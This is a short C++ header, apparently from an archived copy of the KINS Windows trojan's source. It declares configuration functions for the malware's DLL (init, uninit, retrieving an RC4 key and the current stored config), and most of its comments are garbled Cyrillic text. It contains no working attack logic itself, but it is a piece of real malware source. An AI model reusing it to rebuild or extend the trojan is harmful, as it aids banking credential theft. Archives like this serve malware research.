/*
  name      KINS
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  ������ � DllConfig
*/
#pragma once

#include "..\common\binstorage.h"
#include "..\common\crypt.h"

namespace DllConfig
{
  /*
    �������������.
  */
  void init(void);
  
  /*
    ���������������.
  */
  void uninit(void);
  
  /*
   Init RC4 key from current dll config
   OUT rc4Key - RC4 key
  */
  void getRc4Key(Crypt::RC4KEY *rc4Key);
  /*
    �������� ������� ������������ � ������ ��������.

    Return - ��������� �� ������(���������� ���������� ����� Mem), ��� NULL � ������ ������.
  */
  BinStorage::STORAGE *getCurrent(void);

};
